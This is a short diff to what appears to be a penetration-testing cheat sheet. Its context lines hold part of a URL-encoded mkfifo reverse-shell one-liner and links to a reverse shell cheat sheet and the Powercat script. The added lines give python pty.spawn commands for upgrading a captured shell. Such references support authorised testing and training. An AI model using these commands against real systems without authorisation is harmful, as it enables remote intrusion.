@@ -45,6 +45,12 @@ rm%20%2Ftmp%2Ff%20%3B%20mkfifo%20%2Ftmp%2Ff%20%3B%20cat%20%2Ftmp%2Ff%20%7C%20%2F
 ```
 Other shells: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
+Recover a shell TTY:
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+python -c 'import pty; pty.spawn("/bin/sh")'
+```
+
 ## Powercat - Office
 
 Powercat script: https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
